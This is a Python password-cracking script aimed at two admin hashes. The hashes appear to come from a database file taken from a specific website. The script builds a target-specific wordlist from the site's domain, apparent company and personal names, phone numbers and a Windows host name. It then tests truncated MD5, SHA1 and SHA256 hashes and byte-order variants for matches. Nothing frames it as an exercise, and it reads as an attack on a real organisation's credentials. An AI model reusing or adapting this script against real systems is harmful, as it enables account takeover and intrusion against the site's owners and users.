#!/usr/bin/env python3
"""Try to extract data from MDB and try more hash variants."""
import hashlib, binascii, sys, struct

T = {"admin":"2d9d5942943a1323","admin999":"79dca16741891333"}

# Read MDB file - try to find passwords/hashes
try:
 with open("/tmp/bj_db.mdb","rb") as f:
  data = f.read()
 print("MDB size:", len(data), file=sys.stderr)
 # Search for our hash values in the file
 for name, target in T.items():
  if target.encode() in data:
   idx = data.index(target.encode())
   print("Found %s hash at offset %d" % (name, idx), file=sys.stderr)
   print("Context:", data[max(0,idx-20):idx+20], file=sys.stderr)
  elif target.upper().encode() in data:
   idx = data.index(target.upper().encode())
   print("Found %s hash (upper) at offset %d" % (name, idx), file=sys.stderr)
except Exception as e:
 print("MDB error:", e, file=sys.stderr)

# Load password files
PW = set()
for f in ["/tmp/bj_pass.txt","/tmp/bj_uniq.txt","/tmp/pass_big.txt","/tmp/pass.txt"]:
 try:
  with open(f) as fh:
   for ln in fh:
    p=ln.strip()
    if p and not p.startswith("#"): PW.add(p)
 except: pass

# Also load all site-specific files
import glob
for f in glob.glob("/tmp/s_*") + glob.glob("/tmp/old_*"):
 try:
  with open(f) as fh:
   for ln in fh:
    p=ln.strip()
    if p and not p.startswith("#") and len(p) < 50: PW.add(p)
 except: pass

EX = ["admin","Admin","ADMIN","admin999","Admin999","ADMIN999",
      "bjhzsv","BJZHSV","bjhzsv.com","bjhzsv123",
      "35080508","62489782","hongzuo","shengwei",
      "hermes","Hermes","password","Password","PASSWORD",
      "passw0rd","letmein","welcome","root","Root",
      "123456","12345678","111111","000000",
      "qwerty","Qwerty","abc123","admin123","admin888","admin@123",
      "admin2016","admin2017","admin2018","admin2019","admin2020",
      "admin2021","admin2022","admin2023","admin2024","admin2025",
      "!QAZ2wsx","1qaz2wsx","zaq12wsx","P@ssw0rd",
      "cnkuai","CNKuai","cnkuai123","cnkuai2016","cnkuai888",
      "tjzr","TJZR","tjzr123","tjzr2016","tjzr888",
      "zhuiri","ZhuiRi","zhuiri123","zhuiri2016","zhuiri888",
      "Server2016","Server2019","Server2020","Server2022","Server2024",
      "Windows2016","Windows2019","Windows2020","Windows2022",
      "8LRG32Q4EGA","WIN-8LRG32Q4EGA","WIN8LRG32Q4EGA",
      "13681449049","01062489782",
      "Aa123456","Admin123","administrator","Administrator",
      "bjhzsv2011","bjhzsv888","hzsv","hzsv123","hzsv2011","hzsv888"]

for e in EX:
 PW.add(e);PW.add(e.upper());PW.add(e.lower());PW.add(e.capitalize())
 PW.add(e[::-1])
 for c in e: PW.add(e.swapcase())

print("Loaded",len(PW),"passwords", file=sys.stderr)

# Additional hash functions
def sha256_full(d):
 return hashlib.sha256(d.encode()).hexdigest()

def sha1_full(d):
 return hashlib.sha1(d.encode()).hexdigest()

def md5_full(d):
 return hashlib.md5(d.encode()).hexdigest()

# Try the full 32-char hashes trimmed to 16
for p in sorted(PW):
 for n,f in [("MD5",md5_full),("SHA1",sha1_full),("SHA256",sha256_full)]:
  try:
   full = f(p)
   r = full[:16].lower()
   for u,t in T.items():
    if r == t:
     print("MATCH [%s:16] %s -> %s (%s)" % (n,repr(p),r,u))
   r = full[16:32].lower()
   for u,t in T.items():
    if r == t:
     print("MATCH [%s:32] %s -> %s (%s)" % (n,repr(p),r,u))
  except: pass

# Try the hash as 8-byte little-endian and big-endian integers
for p in sorted(PW):
 for u,t in T.items():
  try:
   val = int(t, 16)
   # Pack as 8-byte little-endian and big-endian
   be_bytes = struct.pack(">Q", val)
   le_bytes = struct.pack("<Q", val)
   str_be = be_bytes.decode("ascii", errors="replace").strip("\x00")
   str_le = le_bytes.decode("ascii", errors="replace").strip("\x00")
   if str_be == p or str_le == p:
    print("MATCH [int64] %s -> %s (%s)" % (repr(p), t, u))
   # Try hex of the bytes
   if binascii.hexlify(be_bytes).decode() == p or binascii.hexlify(le_bytes).decode() == p:
    print("MATCH [int64-hex] %s -> %s (%s)" % (repr(p), t, u))
  except: pass

# Try treating hash as hex-encoded 8 bytes, swap byte order
for p in sorted(PW):
 for u,t in T.items():
  try:
   raw = binascii.unhexlify(t)
   # Reverse bytes
   rev = raw[::-1]
   # Interpret bytes as various types
   for byte_order, swap in [("normal", raw), ("reversed", rev)]:
    # Try as uint64 big endian
    v = int.from_bytes(swap, "big")
    # Convert to string
    s = str(v)
    if s == p:
     print("MATCH [uint64->str] %s -> %s (%s, order=%s)" % (repr(p), t, u, byte_order))
   # Try as uint64 interpreted as hex
   v = int.from_bytes(raw, "little")
   h = format(v, "x")
   if h == p.lower():
    print("MATCH [LE-uint64-hex] %s -> %s (%s)" % (repr(p), t, u))
   v = int.from_bytes(raw, "big")
   h = format(v, "x")
   if h == p.lower():
    print("MATCH [BE-uint64-hex] %s -> %s (%s)" % (repr(p), t, u))
  except: pass

print("Done with extended tests", file=sys.stderr)
